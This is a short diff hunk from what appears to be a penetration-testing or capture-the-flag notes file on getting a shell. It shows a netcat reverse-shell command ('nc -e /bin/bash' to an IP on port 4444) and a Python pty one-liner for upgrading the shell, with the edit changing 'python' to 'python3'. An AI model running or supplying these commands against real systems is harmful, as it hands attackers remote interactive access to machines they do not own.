@@ -4,7 +4,7 @@ nc -e /bin/bash 192.168.122.209 4444
 
 python3 -V
 
-python -c 'import pty; pty.spawn("/bin/bash")' 
+python3 -c 'import pty; pty.spawn("/bin/bash")' 
 
 Ctrl + Z (background the shell)
 
